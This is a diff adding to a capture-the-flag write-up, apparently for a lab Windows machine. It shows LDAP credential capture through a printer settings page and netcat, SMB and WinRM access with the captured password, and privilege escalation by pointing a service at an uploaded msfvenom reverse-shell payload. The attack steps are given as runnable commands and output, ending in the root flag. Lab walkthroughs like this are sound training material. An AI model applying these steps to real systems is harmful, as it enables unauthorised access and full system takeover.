@@ -171,5 +171,61 @@ do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED
 
 enum4linux complete on Thu Aug  3 17:37:11 2023
 ```
-- we dont find much we go to the website
-- Navigating to Settings reveals a username and domain name
+- we dont find much here and also in crackmeexec we go to the website
+- Navigating to Settings reveals a username and domain name and server addres we open netcat and change server addres to our ip and press update
+```
+┌──(kali㉿kali)-[~]
+└─$ nc -nvlp 389                 
+Listening on 0.0.0.0 389
+Connection received on 10.10.11.108 63598
+0*`%return\svc-printer�
+                       1edFg43012!!
+```
+- it’s an LDAP bindRequest, with the username return\svc-printer and the simple authentication (password) of “1edFg43012!!”
+- check crackmapexec with the creds found in smb and winrm and both return results
+```
+┌──(kali㉿kali)-[~]
+└─$ crackmapexec smb 10.10.11.108 --shares -u svc-printer -p '1edFg43012!!'
+SMB         10.10.11.108    445    PRINTER          [*] Windows 10.0 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)
+SMB         10.10.11.108    445    PRINTER          [+] return.local\svc-printer:1edFg43012!! 
+SMB         10.10.11.108    445    PRINTER          [+] Enumerated shares
+SMB         10.10.11.108    445    PRINTER          Share           Permissions     Remark
+SMB         10.10.11.108    445    PRINTER          -----           -----------     ------
+SMB         10.10.11.108    445    PRINTER          ADMIN$          READ            Remote Admin
+SMB         10.10.11.108    445    PRINTER          C$              READ,WRITE      Default share
+SMB         10.10.11.108    445    PRINTER          IPC$            READ            Remote IPC
+SMB         10.10.11.108    445    PRINTER          NETLOGON        READ            Logon server share 
+SMB         10.10.11.108    445    PRINTER          SYSVOL          READ            Logon server share 
+```
+- since winrm return results we use evilwinrm to get shell
+```
+evil-winrm -i 10.10.11.108 -u svc-printer -p '1edFg43012!!'
+```
+- and we got a shell as user
+# Privilege Escilation
+- whoami /groups to find groups the user are in some groups add up after searching each group the Server Operators jumps out immediately. This group can do a lot of things
+- Members of this group can start/stop system services. Let's modify a service binary path to obtain a reverse shell
+- use msfvenom
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.4 LPORT=1337 -f exe > shel.exe
+```
+- now with evilwinrm upload it using upload command
+```
+upload shel.exe
+```
+- no go to msfconsole and use multi/handler with payload 'set PAYLOAD windows/meterpreter/reverse_tcp'
+- Using the existing shell, let's modify a service binary path to obtain a reverse shell
+```
+sc.exe config vss binPath="C:\Users\svc-printer\Desktop\shel.exe"
+```
+- now to pltain rev shell
+```
+sc.exe stop vss
+sc.exe start vss
+```
+- and we got a meterpeter shell with nt authority but session dies after 30 sec so we migrate to aprocces with nt authoruty and we got a stable shell
+```
+C:\Users\Administrator\Desktop>type root.txt
+type root.txt
+90c17acbba2135d8b878576d08694a64
+```
